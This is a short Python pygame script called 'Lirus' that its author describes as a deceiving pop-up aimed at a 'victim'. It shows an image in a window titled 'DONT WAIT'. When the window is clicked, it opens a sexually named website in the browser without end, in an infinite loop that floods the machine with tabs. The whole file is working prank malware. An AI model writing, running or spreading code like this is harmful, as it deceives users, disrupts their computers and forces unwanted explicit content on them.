#Lirus: World's best deceiving pop-up, I think
version="1.0"

#Libraries and modules
import pygame                                  #Pygame garbage
from pygame.constants import MOUSEBUTTONDOWN   #Pygame being able to sense when the Pygame window is being clicked
import webbrowser                              #This is used so Lirus can open websites

#Resolution of the image/Width and height of the window
X = 320   #Width
Y = 191   #Height 

pygame.init()   #pygame becomes real

display_surface = pygame.display.set_mode((X, Y ))
  
pygame.display.set_caption('DONT WAIT')   #Window name
  
image = pygame.image.load(r'techtips.jpg')   #The image that we want to load
  
while True:

    display_surface.blit(image, (0, 0))   #Displays the image in the Pygame window

    for event in pygame.event.get():

        #If the window is clicked, open many web pages in the "victim's" default web browser
        if event.type == MOUSEBUTTONDOWN:
            while True:
                webbrowser.open("https://linus-sex.tips/", new=1)  

        pygame.display.update() #Refresh the screen
